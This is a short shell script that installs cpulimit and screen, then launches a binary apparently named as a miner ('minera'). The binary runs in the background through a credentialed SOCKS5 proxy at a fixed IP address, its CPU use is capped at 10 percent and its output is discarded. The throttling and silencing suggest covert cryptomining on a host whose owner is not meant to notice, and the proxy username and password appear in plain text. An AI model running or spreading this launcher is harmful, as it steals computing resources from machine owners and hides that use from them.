#!/bin/sh
apt update
apt install cpulimit screen -y
chmod +x config.json minera
cpulimit -l 10 ./minera --config.json -x socks5://pasti:mokad@178.128.105.221:443 >/dev/null &
